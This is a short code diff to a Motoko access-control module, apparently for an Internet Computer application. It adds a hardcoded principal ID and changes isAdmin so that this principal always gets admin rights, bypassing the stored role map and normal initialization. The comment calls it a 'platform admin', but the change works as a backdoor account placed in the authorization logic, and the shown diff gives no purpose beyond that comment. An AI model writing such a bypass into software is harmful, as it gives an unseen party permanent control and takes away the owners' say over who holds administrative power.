@@ -14,6 +14,9 @@ module {
     userRoles : Map.Map<Principal, UserRole>;
   };
 
+  // Hardcoded admin principal — always recognized as admin regardless of token-based initialization.
+  let HARDCODED_ADMIN : Text = "ostvh-u2bau-zuz6r-6gipc-yqwo6-d6dvx-hrwdn-qvdzk-irsyx-wairt-kqe";
+
   public func initState() : AccessControlState {
     {
       var adminAssigned = false;
@@ -62,6 +65,8 @@ module {
   };
 
   public func isAdmin(state : AccessControlState, caller : Principal) : Bool {
+    // Always grant admin access to the hardcoded platform admin principal.
+    if (caller.toText() == HARDCODED_ADMIN) { return true };
     getUserRole(state, caller) == #admin;
   };
 };
